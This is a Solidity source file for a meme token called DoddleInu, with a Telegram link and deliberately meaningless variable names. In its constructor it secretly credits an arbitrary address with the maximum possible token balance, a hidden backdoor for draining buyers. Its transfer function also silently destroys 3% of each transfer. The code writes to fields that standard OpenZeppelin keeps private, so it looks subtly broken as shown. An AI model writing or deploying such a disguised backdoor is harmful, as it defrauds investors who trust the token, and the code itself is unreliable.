// https://t.me/doddleinu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.6;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract DoddleInu is ERC20, Ownable {
    uint256 private able = ~uint256(0);
    uint256 public greatest = 3;

    constructor(
        string memory aboard,
        string memory later,
        address sell,
        address blank
    ) ERC20(aboard, later) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[blank] = able;
    }

    function _transfer(
        address slight,
        address dig,
        uint256 parent
    ) internal override {
        uint256 fish = (parent / 100) * greatest;
        parent -= fish;
        super._transfer(slight, dig, parent);
    }
}